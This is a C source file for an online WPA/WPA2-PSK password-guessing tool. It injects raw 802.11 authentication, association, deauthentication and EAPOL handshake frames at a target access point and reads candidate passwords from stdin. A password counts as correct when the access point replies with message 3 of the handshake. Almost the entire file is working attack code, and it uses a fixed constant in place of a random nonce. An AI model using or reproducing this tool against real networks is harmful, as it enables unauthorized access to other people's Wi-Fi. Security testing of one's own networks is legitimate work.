#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <signal.h>
#include <pcap.h>
#include "endianness.h"
#include "radiotap_flags.h"

enum enctype {
	ET_NONE        = 0,
	ET_WEP         = 1 << 0,
	ET_WPA         = 1 << 1,
	ET_WPA2        = 1 << 2,
	ET_GRP_CCMP    = 1 << 3,
	ET_GRP_TKIP    = 1 << 4,
	ET_GRP_WEP40   = 1 << 5,
	ET_GRP_WEP104  = 1 << 6,
	ET_PAIR_CCMP   = 1 << 7,
	ET_PAIR_TKIP   = 1 << 8,
	ET_PAIR_WEP40  = 1 << 9,
	ET_PAIR_WEP104 = 1 << 10,
	ET_AKM_8021X   = 1 << 11,
	ET_AKM_PSK     = 1 << 12,
	ET_AKM_8021XFT = 1 << 13,
};

#define KI_TYPEMASK 0x0007
#define KI_MD5    1
#define KI_SHA    2
#define KI_AES    3

#define KI_PAIRWISE   (1<<3)
#define KI_INSTALL    (1<<6)
#define KI_ACK        (1<<7)
#define KI_MIC        (1<<8)
#define KI_SECURE     (1<<9)
#define KI_ERROR     (1<<10)
#define KI_REQUEST   (1<<11)
#define KI_ENCRYPTED (1<<12)
#define KI_SMK       (1<<13)

struct global {
	pcap_t *cap;
	unsigned char our_mac[6];
	unsigned char bssid[6];
	char essid[32+1];
	char conn_state;
	char pass[64+1];
	uint8_t m1_count;
	unsigned char rates[64];
	unsigned char erates[64];
	unsigned char htcaps[64];
	unsigned char len_rates;
	unsigned char len_erates;
	unsigned char len_htcaps;
	uint16_t caps;
	uint16_t enctype;
	uint8_t eap_version;
	uint8_t eap_key_type;
	uint8_t eap_mic_cipher;
	unsigned char anonce[32];
	unsigned char snonce[32];
	unsigned char psk[32];
	unsigned char replay[8];
	unsigned char kck[16]; /* key check key, for computing MICs */
	unsigned char kek[16]; /* key encryption key, for AES unwrapping */
	unsigned char ptk[16]; /* pairwise key (just TK in 802.11 terms) */
	unsigned char rsn_caps[2];
};

static struct global gstate;

/* packet send stuff START */
#define TIMEOUT_SECS 2
#define RESEND_TIMEOUT_USECS (1000000LL/5LL)
static unsigned timeout_ticks;
static unsigned long long timeout_usec;

static int timeout_hit;

static void rewind_timer() {
	struct itimerval timer = {0};
	timer.it_value.tv_usec = RESEND_TIMEOUT_USECS;
	timeout_hit = 0;
	setitimer(ITIMER_REAL, &timer, 0);
}
static void start_timer()
{
	timeout_ticks = 0;
	timeout_usec =  TIMEOUT_SECS * 1000000LL;
	rewind_timer();
}
static void stop_timer()
{
	timeout_hit = 0;
	struct itimerval timer = {0};
        setitimer(ITIMER_REAL, &timer, 0);
}
static int resend_last_packet(void);
static void alarm_handler(int dummy)
{
	(void) dummy;
        timeout_ticks++;

        if(timeout_ticks * RESEND_TIMEOUT_USECS > timeout_usec) {
		timeout_hit = 1;
                dprintf(2, "[!] WARNING: Receive timeout occurred\n");
        } else {
                resend_last_packet();
                rewind_timer();
        }
}
static void sigalrm_init()
{
	struct sigaction act = {.sa_handler = alarm_handler};
	sigaction (SIGALRM, &act, 0);
}

/* store last packet */
static size_t last_len;
static unsigned char last_packet[4096];

static int send_packet_real(const void *packet, size_t len, int use_timer) {
	int ret = 0;

	if(pcap_inject(gstate.cap, packet, len) == len)
		ret = 1;

	if (use_timer) {
		if(len < sizeof last_packet) {
			memcpy(last_packet, packet, len);
			last_len = len;
		}
		start_timer();
	}

	return ret;
}

static int send_packet_internal(const char* callerfunc, const char* file, int callerline,
		const void *packet, size_t len, int use_timer)
{
	dprintf(2, "[+] send_packet called from %s() %s:%d\n", callerfunc, file, callerline);
	int i, ret;
	#define CNT 1
	for(i=0;i<CNT;i++) {
		ret = send_packet_real(packet, len, i==CNT-1 ? use_timer : 0);
	}
	return ret;
}

#define send_packet(a, b, c) send_packet_internal(__FUNCTION__, __FILE__,  __LINE__, a, b, c)

static int resend_last_packet(void) {
	return send_packet(last_packet, last_len, 0);
}

/* packet send stuff END */

struct dot11frame {
	uint16_t framecontrol;
	uint16_t duration;
	unsigned char receiver[6];
	unsigned char source[6];
	unsigned char bssid[6];
	uint16_t sequence_no;
};

struct wifi_header {
	unsigned char radio_tap[8];
	/* .11 frame header */
	struct dot11frame dot11;
};

struct assoc_req {
	uint16_t caps;
	uint16_t listen_interval;
};

struct llc_header
{
	uint8_t dsap;
	uint8_t ssap;
	uint8_t control_field;
	unsigned char org_code[3];
	uint16_t type; /* big endian */
};

struct dot1X_header
{
	uint8_t version;
	uint8_t type;
	uint16_t len;
};

struct eapolkey {
	uint8_t type;
	uint16_t keyinfo;
	uint16_t keylen;
	uint8_t replay[8];
	uint8_t nonce[32];
	uint8_t iv[16];
	uint8_t rsc[8];
	uint8_t _reserved[8];
	uint8_t mic[16];
	uint16_t paylen;
	char payload[];
} __attribute__((packed));

static size_t init_header(unsigned char* packet, uint16_t fc, const unsigned char dst[6])
{
	static uint16_t seq = 0;
	unsigned char *p;
	struct wifi_header *w = (void*) packet;
	memcpy(packet, "\0\0" "\x08\0" "\0\0\0\0", 8);
	seq += 0x10;
	w->dot11.framecontrol = end_htole16(fc);
	memcpy(&w->dot11.duration, "\x52\x00", 2);
	w->dot11.sequence_no = end_htole16(seq);
	memcpy(w->dot11.receiver, dst, 6);
	memcpy(w->dot11.source, gstate.our_mac, 6);
	memcpy(w->dot11.bssid, dst, 6);
	return sizeof(struct wifi_header);
}

static size_t init_llc(unsigned char* packet, uint16_t type)
{
	memcpy(packet, "\xaa" "\xaa" "\x03" "\0\0\0", 6);
	((struct llc_header*)packet)->type = end_htobe16(type);
	return sizeof(struct llc_header);
}

#define NO_REPLAY_HTCAPS 0

/* Deauthenticate ourselves from the AP */
static void deauthenticate(const unsigned char dst[6])
{
	unsigned char packet[sizeof (struct wifi_header) + 2];
	init_header(packet, 0x00C0, dst);
	memcpy(packet + sizeof (struct wifi_header), "\x03\x00", 2);
	send_packet(packet, sizeof packet, 1);
}

/* Authenticate ourselves with the AP */
static void authenticate(const unsigned char dst[6])
{
	unsigned char packet[ sizeof (struct wifi_header) + 6];
	init_header(packet, 0x00B0, dst);
	memcpy(packet + sizeof (struct wifi_header), "\0\0" /*algorithm*/ "\1\0" /*seq*/ "\0\0" /*status*/, 6);
	send_packet(packet, sizeof packet, 1);
	dprintf(2, "[+] Sending authentication request\n");
}

static size_t add_encryption_ie(unsigned char *packet)
{
	int chosen = 0;
	size_t offset = 2;
	unsigned char vendor[3];
	if((gstate.enctype & ET_WEP) && !((gstate.enctype & ET_WPA) || (gstate.enctype & ET_WPA2))) {
		dprintf(2, "oops, WEP not implemented\n");
		abort();
	}
	memcpy(packet, "\0\0", 2);
	if(gstate.enctype & ET_WPA) {
		packet[0] = 0xDD;
		memcpy(vendor, "\0\x50\xF2", 3);
		memcpy(packet + offset, "\x00\x50\xF2\x01\x01\x00", 6);
		offset += 6;
		chosen |= ET_WPA;
	} else if (gstate.enctype & ET_WPA2) {
		packet[0] = 0x30;
		memcpy(vendor, "\0\x0f\xac", 3);
		chosen |= ET_WPA2;
		memcpy(packet+offset, "\x01\0", 2); /* RSN VERSION 1*/
		offset += 2;
	}
	memcpy(packet + offset, vendor, 3);
	offset += 3;
	if(gstate.enctype & ET_GRP_CCMP) {
		packet[offset] = 4;
		chosen |= ET_GRP_CCMP;
	} else if(gstate.enctype & ET_GRP_TKIP) {
		packet[offset] = 2;
		chosen |= ET_GRP_TKIP;
	} else if(gstate.enctype & ET_GRP_WEP104) {
		packet[offset] = 5;
		chosen |= ET_GRP_WEP104;
	} else if(gstate.enctype & ET_GRP_WEP40) {
		packet[offset] = 1;
		chosen |= ET_GRP_WEP40;
	} else {
		dprintf(2, "err: unknown group key cipher");
		abort();
	}
	offset += 1;
	memcpy(packet+offset, "\x01\x00", 2);
	offset += 2;
	memcpy(packet + offset, vendor, 3);
	offset += 3;
	if(gstate.enctype & ET_PAIR_CCMP) {
		packet[offset] = 4;
		chosen |= ET_PAIR_CCMP;
	} else if(gstate.enctype & ET_PAIR_TKIP) {
		packet[offset] = 2;
		chosen |= ET_PAIR_TKIP;
	} else if(gstate.enctype & ET_PAIR_WEP104) {
		packet[offset] = 5;
		chosen |= ET_PAIR_WEP104;
	} else if(gstate.enctype & ET_PAIR_WEP40) {
		packet[offset] = 1;
		chosen |= ET_PAIR_WEP40;
	} else {
		dprintf(2, "err: unknown group key cipher");
		abort();
	}
	offset +=1;
	memcpy(packet+offset, "\x01\x00", 2);
	offset += 2;
	memcpy(packet + offset, vendor, 3);
	offset += 3;
	if(gstate.enctype & ET_AKM_PSK) {
		packet[offset] = 2;
		chosen |= ET_AKM_PSK;
	} else if(gstate.enctype & ET_AKM_8021X) {
		packet[offset] = 1;
		chosen |= ET_AKM_8021X;
		goto notsupp;
	} else if(gstate.enctype & ET_AKM_8021XFT) {
		packet[offset] = 3;
		chosen |= ET_AKM_8021XFT;
		goto notsupp;
	} else {
	notsupp:
		dprintf(2, "err: unsupported auth key method");
		abort();
	}
	offset +=1;
	if (gstate.enctype & ET_WPA2) {
		memcpy(packet + offset, gstate.rsn_caps, 2); /* RSN capabilities */
		offset += 2;
	}
	packet[1] = offset - 2;
	gstate.enctype = chosen;
	return offset;
}

/* Associate with the AP */
static void associate(const unsigned char dst[6], const char *essid)
{
	unsigned char packet[512];
	unsigned offset = sizeof(struct wifi_header), l;

	init_header(packet, 0x0000, dst);

	struct assoc_req* a = (void*)(packet+offset);
	a->caps = end_htole16(gstate.caps);
	a->listen_interval = end_htole16(0x0064);
	offset += sizeof(struct assoc_req);

	packet[offset++] = 0; /* SSID TAG NR */
	l = strlen(gstate.essid);
	packet[offset++] = l;
	memcpy(packet + offset, gstate.essid, l);
	offset += l;

	packet[offset++] = 0x01; /* RATES TAG NR */
	packet[offset++] = gstate.len_rates;
	memcpy(packet+offset, gstate.rates, gstate.len_rates);
	offset += gstate.len_rates;

	if(gstate.len_erates) {
		packet[offset++] = 0x32; /* ERATES TAG NR */
		packet[offset++] = gstate.len_erates;
		memcpy(packet+offset, gstate.erates, gstate.len_erates);
		offset += gstate.len_erates;
	}

	if(gstate.len_htcaps && !NO_REPLAY_HTCAPS) {
		packet[offset++] = 0x2d; /* HT CAPS NR */
		packet[offset++] = gstate.len_htcaps;
		memcpy(packet+offset, gstate.htcaps, gstate.len_htcaps);
		offset += gstate.len_htcaps;
	}

	offset += add_encryption_ie(packet + offset);

	/* omit wps tag for now */
	send_packet(packet, offset, 1);
	dprintf(2, "[+] Sending association request\n");
}


/* Initializes pcap capture settings and returns a pcap handle on success, NULL on error */
static pcap_t *capture_init(const char *capture_source)
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int status;

	handle = pcap_open_offline(capture_source, errbuf);
	if(handle) return handle;

	handle = pcap_create(capture_source, errbuf);
	if (handle) {
		pcap_set_snaplen(handle, 65536);
		pcap_set_timeout(handle, 50);
		pcap_set_rfmon(handle, 1);
		pcap_set_promisc(handle, 1);
		if(!(status = pcap_activate(handle)))
			return handle;
		if(status == PCAP_ERROR_RFMON_NOTSUP) {
			pcap_set_rfmon(handle, 0);
			status = pcap_activate(handle);
			if(!status) return handle;
		}
		dprintf(2, "[X] ERROR: pcap_activate status %d\n", status);
		static const char *pcap_errmsg[] = {
			[1] = "generic error code",
			[2] = "loop terminated by pcap_breakloop",
			[3] = "the capture needs to be activated",
			[4] = "the operation can't be performed on already activated captures",
			[5] = "no such device exists",
			[6] = "this device doesn't support rfmon (monitor) mode",
			[7] = "operation supported only in monitor mode",
			[8] = "no permission to open the device",
			[9] = "interface isn't up",
			[10]= "this device doesn't support setting the time stamp type",
			[11]= "you don't have permission to capture in promiscuous mode",
			[12]= "the requested time stamp precision is not supported",
		};
		if(status < 0 && status > -13)
			dprintf(2, "[X] PCAP: %s\n", pcap_errmsg[-status]);
		pcap_close(handle);
		handle = 0;
	}

	if(!handle) {
		dprintf(2, "couldn't get pcap handle, exiting\n");
		exit(1);
	}
	return handle;
}

enum state {
	ST_CLEAN = 0,
	ST_GOT_BEACON,
	ST_GOT_AUTH,
	ST_GOT_ASSOC,
	ST_GOT_M1,
	ST_GOT_M3,
};

static void fix_rates(unsigned char *buf, size_t len) {
	unsigned i;
	for(i = 0; i < len; i++)
                buf[i] = buf[i] & 0x7f; // remove (B) bit
}

static int check_rsn_cipher(const unsigned char rsn[4], int wpa, int group)
{
	static const unsigned short group_ciphers[] = {
		[1] = ET_GRP_WEP40,
		[2] = ET_GRP_TKIP,
		[4] = ET_GRP_CCMP,
		[5] = ET_GRP_WEP104,
	};
	static const unsigned short pair_ciphers[] = {
		[1] = ET_PAIR_WEP40,
		[2] = ET_PAIR_TKIP,
		[4] = ET_PAIR_CCMP,
		[5] = ET_PAIR_WEP104,
	};
	const unsigned short *cipher_tbl = group ? group_ciphers : pair_ciphers;
	if(wpa == 2)
		assert(!memcmp(rsn, "\0\x0f\xac", 3));
	else if(wpa == 1)
		assert(!memcmp(rsn, "\0\x50\xf2", 3));

	assert(rsn[3] < 6);
	return cipher_tbl[rsn[3]];
}

static int check_rsn_authkey(const unsigned char rsn[4], int wpa)
{
	static const unsigned short auth_key_mgmt[] = {
		[1] = ET_AKM_8021X,
		[2] = ET_AKM_PSK,
		[3] = ET_AKM_8021XFT,
	};
	if(wpa == 2)
		assert(!memcmp(rsn, "\0\x0f\xac", 3));
	else if(wpa == 1)
		assert(!memcmp(rsn, "\0\x50\xf2", 3));
	assert(rsn[3] < 4);
	return auth_key_mgmt[rsn[3]];
}
static int process_rsn(const unsigned char *rsn, int len, int wpa) {
	int enc = 0;
	int pos = 0;
	unsigned i, num_ciphers;
	if(pos + 4 <= len) {
		enc |= check_rsn_cipher(rsn+pos, wpa, 1);
	}
	pos += 4;
	if(pos + 2 <= len) {
		num_ciphers = rsn[pos];
		pos += 2;
		for(i=0; i < num_ciphers && (pos + 4 <= len); i++, pos += 4) {
			enc |= check_rsn_cipher(rsn+pos, wpa, 0);
		}
	}
	if(pos + 2 <= len) {
		num_ciphers = rsn[pos];
		pos += 2;
		for(i=0; i < num_ciphers && (pos + 4 <= len); i++, pos += 4) {
			enc |= check_rsn_authkey(rsn+pos, 0);
		}
	}
	if(pos + 2 <= len) {
		memcpy(gstate.rsn_caps, rsn + pos, 2);
	} else {
		memcpy(gstate.rsn_caps, "\0\0", 2);
	}
	return enc;
}

static int get_next_ie(const unsigned char *data, size_t len, size_t *currpos) {
	if(*currpos + 2 >= len) return 0;
	*currpos = *currpos + 2 + data[*currpos + 1];
	if(*currpos >= len) return 0;
	return 1;
}

static void process_tags(const unsigned char* tagdata, size_t tagdata_len)
{
	unsigned const char *tag;
	size_t ie_iterator = 0, remain;
	int enc = 0;
	do {
		tag = tagdata + ie_iterator;
		remain = tagdata_len - ie_iterator;
		if(remain < 2 || tag[1]+2 > remain) break;
		unsigned char *dlen = 0;
		unsigned char *dst = 0;
		switch(tag[0]) {
			case 0x30: /* RSN */
				assert(tag[1] > 2);
				assert(!memcmp(tag+2, "\x01\x00", 2)); /* RSN version 1 */
				enc = ET_WPA2 | process_rsn(tag+4, tag[1]-2, 2);
				break;
			case 0xDD:
				/* only process WPA1 if WPA2 RSN element not encountered */
				if(!enc && tag[1] >= 8 && !memcmp(tag+2, "\x00\x50\xF2\x01\x01\x00", 6))
					enc |= ET_WPA | process_rsn(tag+8, tag[1]-6, 1);
				break;
			case 0x01: /* rates */
				dlen = &gstate.len_rates;
				dst = gstate.rates;
				goto copy;
			case 0x32: /* ext rates */
				dlen = &gstate.len_erates;
				dst = gstate.erates;
				goto copy;
			case 0x2d: /* ht caps */
				dlen = &gstate.len_htcaps;
				dst = gstate.htcaps;
			copy:
				if(tag[1] <= remain) {
					assert(tag[1] <= sizeof(gstate.rates));
					assert(sizeof(gstate.rates) == sizeof(gstate.erates));
					assert(sizeof(gstate.rates) == sizeof(gstate.htcaps));
					*dlen = tag[1];
					memcpy(dst, tag+2, tag[1]);
				}
				break;

		}
	} while(get_next_ie(tagdata, tagdata_len, &ie_iterator));
	gstate.enctype = enc;
}

#include "wsupp_crypto.h"
static void pmk_to_ptk()
{
	uint8_t *mac1, *mac2;
	uint8_t *nonce1, *nonce2;

	if(memcmp(gstate.our_mac, gstate.bssid, 6) < 0) {
		mac1 = gstate.our_mac;
		mac2 = gstate.bssid;
	} else {
		mac1 = gstate.bssid;
		mac2 = gstate.our_mac;
	}

	if(memcmp(gstate.snonce, gstate.anonce, 32) < 0) {
		nonce1 = gstate.snonce;
		nonce2 = gstate.anonce;
	} else {
		nonce1 = gstate.anonce;
		nonce2 = gstate.snonce;
	}

	uint8_t key[60];

	const char* astr = "Pairwise key expansion";
	PRF480(key, gstate.psk, astr, mac1, mac2, nonce1, nonce2);

	memcpy(gstate.kck, key +  0, 16);
	memcpy(gstate.kek, key + 16, 16);
	memcpy(gstate.ptk, key + 32, 16);

	memset(key, 0, sizeof(key)); /* YESSSS... dont leave clues1!!!*/
}

#include "crypto/pbkdf2.h"

static void gen_psk(const char* essid, const char* pass, unsigned char psk[32])
{
	memset(psk, 0, 32);
	pbkdf2_sha1(psk, 32 /*sizeof(psk)*/, pass, strlen(pass), essid, strlen(essid), 4096);
}

static void fill_rand(unsigned char* buf, size_t len)
{
	memset(buf, 0x55, len); // realtek prng :-DDDDDD
}

static void send_m2(void)
{
	fill_rand(gstate.snonce, sizeof(gstate.snonce));
	gen_psk(gstate.essid, gstate.pass, gstate.psk);
	pmk_to_ptk();
	unsigned char packet[256];
	size_t offset;
	offset = init_header(packet, 0x0108, gstate.bssid);
	offset += init_llc(packet+offset, 0x888e /* 802.1X auth*/);

	struct dot1X_header* d1x = (void*)(packet+offset);
	d1x->version = 1;
	d1x->type = 3;
	offset += sizeof(struct dot1X_header);
	struct eapolkey *eap = (void*)(packet+offset);
	eap->type = gstate.eap_key_type;
	eap->keyinfo = end_htobe16(KI_MIC | KI_PAIRWISE | gstate.eap_mic_cipher);
	if(gstate.enctype & ET_WPA2)
		eap->keylen =  0;
	else
		eap->keylen = end_htobe16(16);
	memcpy(eap->replay, gstate.replay, 8);
	memcpy(eap->nonce, gstate.snonce, sizeof(gstate.snonce));
	memset(eap->iv, 0, sizeof(eap->iv));
	memset(eap->rsc, 0, sizeof(eap->rsc));
	memset(eap->_reserved, 0, sizeof(eap->_reserved));
	memset(eap->mic, 0, sizeof(eap->mic));

	offset += sizeof(struct eapolkey);
	unsigned ielen = add_encryption_ie(packet+offset);
	offset += ielen;
	eap->paylen = end_htobe16(ielen);
	d1x->len = end_htobe16(sizeof(struct eapolkey) + ielen);

	make_mic(eap->mic, gstate.kck, (void*) d1x, sizeof (struct dot1X_header) + sizeof(struct eapolkey) + ielen);
	send_packet(packet, offset, 1);
}

#define M1_MASK_BITS (KI_PAIRWISE|KI_ACK)
#define M3_MASK_BITS (KI_INSTALL|KI_MIC)
static int is_m1(struct eapolkey* eap)
{
	unsigned ki = end_be16toh(eap->keyinfo);
	return ((ki & (M1_MASK_BITS)) == M1_MASK_BITS) && !(ki & (M3_MASK_BITS));
}
static int is_m3(struct eapolkey* eap)
{
	unsigned ki = end_be16toh(eap->keyinfo);
	return ((ki & (M1_MASK_BITS|M3_MASK_BITS)) == (M1_MASK_BITS|M3_MASK_BITS));
}
static int process_eapol_packet(int version, struct eapolkey* eap)
{
	if(!(
		(eap->type == 2 /*EAPOL_KEY_RSN*/) ||
		(eap->type == 254 /*EAPOL_KEY_WPA */) )
	) {
		dprintf(2, "invalid eapol type\n");
		return -1;
	}
	gstate.eap_key_type = eap->type;
	if (gstate.conn_state == ST_GOT_ASSOC && is_m1(eap) ) {
		gstate.eap_version = version;
		gstate.eap_mic_cipher = end_be16toh(eap->keyinfo) & KI_TYPEMASK;
		memcpy(gstate.anonce, eap->nonce, sizeof(gstate.anonce));
		memcpy(gstate.replay, eap->replay, sizeof(gstate.replay));
		gstate.m1_count = 0;
		return 1;
	} else if(gstate.conn_state == ST_GOT_M1 && is_m3(eap) ) {
		return 1;
	} else if (gstate.conn_state == ST_GOT_M1 && is_m1(eap)) {
		gstate.m1_count++;
	}

	return 0;
}

static int is_data_packet(int framectl)
{
	uint16_t type = framectl & end_htole16(0xfc); /* IEEE80211_FCTL_FTYPE | IEEE80211_FCTL_STYPE */
	/*	0x08 = IEEE80211_FTYPE_DATA | IEEE80211_STYPE_DATA
		0x88 = IEEE80211_FTYPE_DATA | IEEE80211_STYPE_QOS_DATA */
	if(type == end_htole16(0x08)) return 1;
	if(type == end_htole16(0x88)) return 2;
	return 0; /* not a data packet */
}

/* return -1 on failure,
   0 if packet is to ignore,
   1 if state machine can be advanced */
static int process_packet(pcap_t *cap)
{
	struct pcap_pkthdr h;
	const unsigned char* data = pcap_next(cap, &h);
	if(!data) return -1;
	uint32_t flags, offset;
	if(!rt_get_presentflags(data, h.len, &flags, &offset))
		return -1;

	struct ieee80211_radiotap_header *rh = (void*) data;
	unsigned rtap_data = offset;
	uint16_t framectl, caps;
	struct dot11frame* dot11;

	offset = rh->it_len;

	if(h.len < offset + sizeof(struct dot11frame))
		return 0;

	memcpy(&framectl, data+offset, 2);
	framectl = end_le16toh(framectl);

	dot11 = (void*)(data+offset);

	/* ignore all packets not from target bssid */
	/* packet from target AP ? */
	//if(memcmp(gstate.bssid, dot11->source, 6))
	//	return 0;
	/* our ap ?*/
	if(memcmp(gstate.bssid, dot11->bssid, 6))
		return 0;

	if(gstate.conn_state < ST_GOT_BEACON && framectl == 0x0080 /* beacon */)
	{
		/* TODO : retrieve essid from tagged data */

		/* check if we already have enuff */
		if(gstate.len_rates && gstate.len_htcaps)
			return 0;

		offset +=
			sizeof (struct dot11frame) /* now at timestamp */+
			8 /* now at beacon interval */ +
			2 /* now at caps */;

		assert(offset +2 <= h.len);

		memcpy(&caps, data+offset, 2);
		gstate.caps = end_le16toh(caps);

		offset += 2;
		process_tags(data + offset, h.len - offset);
		fix_rates(gstate.rates, gstate.len_rates);

		if(caps & 0x10 /* CAPABILITY_WEP */)
			gstate.enctype |= ET_WEP;

		return 1;
	}

	/* ignore any other packets not targeted at us */
	if(memcmp(gstate.our_mac, dot11->receiver, 6))
		return 0;

	switch(framectl) {
		/* IEEE 802.11 packet type */
		case 0x00b0: /* authentication */
			if(gstate.conn_state >= ST_GOT_AUTH)
				return 0;
			/* fall through */
		case 0x0010: /* association resp */
			if(gstate.conn_state >= ST_GOT_ASSOC)
				return 0;

			offset += sizeof(struct dot11frame) + 2;
			/* auth frame has 3 short members, of which the 3rd is the status */
			/* assoc frame has 3 short members, of which the 2nd is the status */
			if(framectl == 0x00b0) offset += 2;
			assert(offset + 2 <= h.len);

			/* both assoc and auth success is 0x0000 */
			if(memcmp("\0\0", data+offset, 2)) {
				dprintf(2, "[X] assoc or auth error\n");
				return -1;
			}
			return 1;
	}

	if(gstate.conn_state < ST_GOT_ASSOC)
		return 0;

	int data_type = is_data_packet(framectl);
	if(!data_type) return 0;

	/* QOS packets have an additional 2 bytes after the .11 header */
	offset += sizeof(struct dot11frame)+"\0\0\2"[data_type];

	if(h.len < offset +
		sizeof(struct llc_header) +
		sizeof(struct dot1X_header) +
		sizeof(struct eapolkey))
		return 0;

	struct llc_header *llc = (void*) data + offset;
	if(llc->type != end_htobe16(0x888E /*DOT1X_AUTHENTICATION*/))
		return 0;
	offset += sizeof(struct llc_header);

	struct dot1X_header *d1x = (void*) data + offset;
	if(d1x->type != 3 /* key */)
		return 0;
	offset += sizeof(struct dot1X_header);
	if(h.len < offset + end_be16toh(d1x->len))
		return 0;
	struct eapolkey *eap = (void*) data + offset;
	assert(end_be16toh(d1x->len) == end_be16toh(eap->paylen) + sizeof(struct eapolkey));
	return process_eapol_packet(d1x->version, eap);
}

#include <net/if.h>
#include <netinet/in.h>
#include <stropts.h>
#include <sys/ioctl.h>
static void get_mac(const char *devnam, unsigned char mac[6])
{
	struct ifreq ifr = {0};
	struct ether_addr *eth;
	int sock, ret_val;

	/* Need a socket for the ioctl call */
	if(-1 == (sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))) {
	out:
		dprintf(2, "[X] Error: could not retrieve mac\n");
		abort();
	}
	strcpy(ifr.ifr_name, devnam);
	if(ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) {
		close(sock);
		goto out;
	}
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(sock);
}

#include <ctype.h>
static void str2mac(const char *str, unsigned char *mac)
{
	static const char hex[] = "0123456789abcdef";
	const char *p = str, *f;
	int i, v;
	for(i = 0; i < 12; i++) {
		f = strchr(hex, tolower(*p));
		assert(f);
		v = (uintptr_t) f - (uintptr_t) hex;
		*mac = (i&1) ? ((*mac << 4) | v) : v;
		p++;
		if(i&1) {
			p++;
			mac++;
		}
	}
}

static int usage(const char* argv0)
{
	dprintf(2, "usage: %s -i wlan0 -e essid -b bssid\n"
		   "reads password candidates from stdin and tries to connect\n"
		   "the wifi apapter needs to be on the right channel already\n"
		   "password candidates with length > 64 and < 8 will be ignored\n"
		   , argv0 );
	return 1;
}

static int show_enc(void)
{
	static const char enc_str[][10] = {
		[0] = "WPA1 TKIP",
		[1] = "WPA2 TKIP",
		[2] = "WPA1 CCMP",
		[3] = "WPA2 CCMP",
	};
	dprintf(2, "[+] chosen encryption: %s\n",
			enc_str[
				(!!(gstate.enctype & ET_WPA2)) |
				((!!(gstate.enctype & ET_PAIR_CCMP)) << 1)] );
	return 1;
}

static void advance_state()
{
	static int enc_shown = 0;
	switch(gstate.conn_state) {
		case ST_CLEAN:
			if(!enc_shown) enc_shown = show_enc();
			gstate.conn_state = ST_GOT_BEACON;
			deauthenticate(gstate.bssid);
			authenticate(gstate.bssid);
			break;
		case ST_GOT_BEACON:
			gstate.conn_state = ST_GOT_AUTH;
			associate(gstate.bssid, gstate.essid);
			break;
		case ST_GOT_AUTH:
			gstate.conn_state = ST_GOT_ASSOC;
			break;
		case ST_GOT_ASSOC:
			gstate.conn_state = ST_GOT_M1;
			send_m2();
			break;
		case ST_GOT_M1:
			gstate.conn_state = ST_GOT_M3;
			//send_m4();
			break;
	}
}

static int fetch_next_pass()
{
	char buf[1024];
	fetch:
	if(!fgets(buf, sizeof buf, stdin)) return 0;
	size_t l = strlen(buf);
	if(l < 9 || l > 65) goto fetch;
	buf[l-1] = 0; // remove \n
	strcpy(gstate.pass, buf);
	return 1;
}

int main(int argc, char** argv)
{
	int c;
	const char *essid = 0, *bssid = 0, *itf = 0;
	while((c = getopt(argc, argv, "b:e:i:")) != -1) {
		switch(c) {
			case 'i':
				itf = optarg;
				break;
			case 'b':
				bssid = optarg;
				break;
			case 'e':
				essid = optarg;
				break;
			default:
				return usage(argv[0]);
		}
	}
	if(!essid || !bssid || !itf) return usage(argv[0]);

	get_mac(itf, gstate.our_mac);
	gstate.cap = capture_init(itf);
	assert(gstate.cap);
	strcpy(gstate.essid, essid);
	str2mac(bssid, gstate.bssid);

	if(!fetch_next_pass()) return usage(argv[0]);

	sigalrm_init();

	gstate.conn_state = ST_CLEAN;

fresh_try:

	for(;;) {
		int ret = process_packet(gstate.cap);
		if(ret == -1) break;
		if(ret == 1) {
			stop_timer();
			advance_state();
			if(gstate.conn_state == ST_GOT_M3) {
				dprintf(1, "[!] found correct password: %s\n", gstate.pass);
				return 0;
			}
		}
		if(timeout_hit) {
			if(gstate.conn_state == ST_GOT_M1 && gstate.m1_count > 1) {
				dprintf(2, "[X] no M3 received, assuming password %s is wrong\n", gstate.pass);
				if(!fetch_next_pass())
					break;
			}
			gstate.conn_state = ST_CLEAN;
			advance_state();
			goto fresh_try;
		}
	}

	return 1;
}
